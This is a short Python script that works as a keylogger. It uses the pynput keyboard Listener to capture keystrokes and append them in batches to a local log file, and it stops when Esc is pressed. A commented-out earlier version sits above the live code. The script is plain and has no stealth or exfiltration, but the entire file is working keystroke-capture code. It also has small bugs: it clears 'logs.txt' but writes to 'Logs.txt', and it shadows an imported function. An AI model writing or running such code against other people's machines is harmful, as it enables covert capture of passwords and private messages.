# from distutils.file_util import write_file
# import pynput
# from pynput.keyboard import Key, Listener

# word_counts = 0
# keys = []


# def on_press(key):
#     global word_counts, keys
#     keys.append(key)
#     word_counts += 1
#     if word_counts >= 5:
#         word_counts = 0
#         write_file(keys)
#         keys = []


# def write_file(key_arr):
#     with open("logs.txt", "a") as f:
#         for key in key_arr:
#             ke = str(key).replace("'", "")

#             if ke == "Key.space":
#                 f.write(" ")
#             elif ke.find("Key") == -1:  # Exclude other special keys like 'Key.shift'
#                 f.write(ke + " ")  # Write the character followed by a space


# def on_release(key):
#     if key == Key.esc:
#         return False


# with Listener(on_press=on_press, on_release=on_release) as listner:
#     listner.join()


from distutils.file_util import write_file
import pynput
from pynput.keyboard import Key, Listener

# Empty the logs.txt file at the start
open("logs.txt", "w").close()

word_counts = 0
keys = []


def on_press(key):
    global word_counts, keys
    keys.append(key)
    word_counts += 1
    if word_counts >= 5:
        word_counts = 0
        write_file(keys)
        keys = []


def write_file(key_arr):
    with open("Logs.txt", "a") as f:
        for key in key_arr:
            ke = str(key).replace("'", "")

            if ke == "Key.space":
                f.write("' '")  # Encapsulate space within single quotes
            elif ke.find("Key") == -1:  # Exclude other special keys like 'Key.shift'
                f.write(
                    "'" + ke + "' "
                )  # Encapsulate each character within single quotes followed by a space


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
